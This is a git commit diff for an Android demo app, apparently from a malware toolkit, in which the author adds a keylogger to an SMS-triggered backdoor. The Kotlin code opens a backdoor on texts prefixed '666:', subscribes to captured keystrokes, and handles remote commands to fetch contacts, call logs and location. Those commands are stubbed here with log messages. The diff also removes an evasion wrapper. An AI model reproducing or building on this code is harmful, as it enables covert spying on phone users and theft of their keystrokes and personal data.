c43c134a7f6dc90c74854050997952b929237381
evilthreads <evilthreads669966@gmail.com>
2020-10-06 19:27:27 -0500

    added keylogger into demo app

--- app/src/main/java/com/evilthreads/evademe/MainActivity.kt
+++ app/src/main/java/com/evilthreads/evademe/MainActivity.kt
@@ -5,6 +5,7 @@ import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import com.evilthreads.evade.evade
+import com.evilthreads.keylogger.Keylogger
 import com.evilthreads.smsbackdoor.SmsBackdoor
 import com.kotlinpermissions.KotlinPermissions
 
@@ -33,21 +34,20 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        evade {
-            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
-                SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
-                    when(remoteCommand){
-                        "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
-                        "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
-                        "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
-                        else -> Log.d(TAG, "COMMAND NOT FOUND")
-                    }
+        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
+            SmsBackdoor.openDoor(this, "666:", payload = {
+                Keylogger.subscribe { entry ->
+                    Log.d("KEYLOGGER", entry.toString())
                 }
-            }.ask()
-        }.onEscape {
-            Log.d(TAG, "SMS BACKDOOR WAS NOT OPENED BECAUSE IT WASN'T SAFE!")
-        }.onSuccess {
-            Log.d(TAG, "SMS BACKDOOR WAS OPENED!")
-        }
+            }){ remoteCommand ->
+                when(remoteCommand){
+                    "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
+                    "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
+                    "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
+                    else -> Log.d(TAG, "COMMAND NOT FOUND")
+                }
+            }
+            Keylogger.requestPermission(this)
+        }.ask()
     }
 }
